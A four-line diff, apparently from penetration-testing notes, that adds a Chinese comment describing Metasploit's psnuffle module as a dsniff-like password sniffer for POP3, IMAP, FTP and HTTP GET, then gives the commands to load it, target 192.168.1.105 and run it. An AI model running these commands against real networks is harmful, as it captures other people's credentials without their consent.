@@ -1,0 +1,4 @@
+#这个 psnuffle 模块可以像以前的 dsniff 命令一样，去嗅探密码，只支持 pop3、imap、ftp、HTTP GET 协议。
+use auxiliary/sniffer/psnuffle
+set RHOSTS 192.168.1.105
+run
